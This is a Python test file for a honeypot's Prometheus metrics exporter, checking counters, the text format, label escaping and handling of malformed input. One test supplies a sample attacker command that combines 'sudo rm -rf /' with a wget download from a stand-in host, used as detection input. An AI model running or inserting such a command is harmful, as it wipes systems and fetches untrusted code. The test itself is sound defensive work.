"""Tests for the Prometheus metrics builder (v2.3.0)."""

from __future__ import annotations

from baitbox.metrics import build_prometheus_metrics
from baitbox.anomaly import analyze_event, reset_metrics


def _sample_stats() -> dict:
    return {
        "total_events": 42,
        "by_protocol": [
            {"protocol": "SSH", "count": 20},
            {"protocol": "HTTP", "count": 18},
            {"protocol": "Telnet", "count": 4},
        ],
        "by_event_type": [
            {"event_type": "auth_attempt", "count": 15},
            {"event_type": "command", "count": 12},
        ],
    }


def test_metrics_includes_core_counters():
    payload = build_prometheus_metrics(_sample_stats(), blocked_count=3, session_count=2)
    assert "baitbox_events_total 42" in payload
    assert 'baitbox_events_protocol_total{protocol="SSH"} 20' in payload
    assert 'baitbox_events_type_total{event_type="command"} 12' in payload
    assert "baitbox_blocked_ips 3" in payload
    assert "baitbox_active_sessions 2" in payload


def test_metrics_uses_prometheus_text_format():
    payload = build_prometheus_metrics(_sample_stats(), blocked_count=0, session_count=0)
    assert "# HELP baitbox_events_total" in payload
    assert "# TYPE baitbox_events_total counter" in payload
    assert payload.endswith("\n")


def test_metrics_includes_attack_and_threat_data():
    reset_metrics()
    analyze_event({
        "src_ip": "203.0.113.7",
        "protocol": "SSH",
        "event_type": "command",
        "payload": {"command": "sudo rm -rf / && wget http://evil.example/x.sh"},
    })
    payload = build_prometheus_metrics(_sample_stats(), blocked_count=0, session_count=0)
    assert "baitbox_tracked_ips" in payload
    assert "baitbox_active_threats" in payload
    assert 'baitbox_mitre_technique_ips{technique_id="T1548.003"}' in payload
    reset_metrics()


def test_metrics_escapes_label_characters():
    stats = _sample_stats()
    stats["by_protocol"].append({"protocol": 'Weird"Proto', "count": 1})
    payload = build_prometheus_metrics(stats, blocked_count=0, session_count=0)
    assert 'protocol="Weird\\"Proto"' in payload


def test_metrics_tolerates_malformed_stats():
    # None, non-dict rows and non-numeric counts must not raise
    assert build_prometheus_metrics(None, blocked_count=0, session_count=0).startswith("# HELP")
    stats = {
        "total_events": "not-a-number",
        "by_protocol": None,
        "by_event_type": [1, 2, {"event_type": "command", "count": "x"}],
    }
    payload = build_prometheus_metrics(stats, blocked_count=-1, session_count=10**9)
    assert "baitbox_events_total 0" in payload
    assert 'baitbox_events_type_total{event_type="command"} 0' in payload
    assert "baitbox_blocked_ips -1" in payload
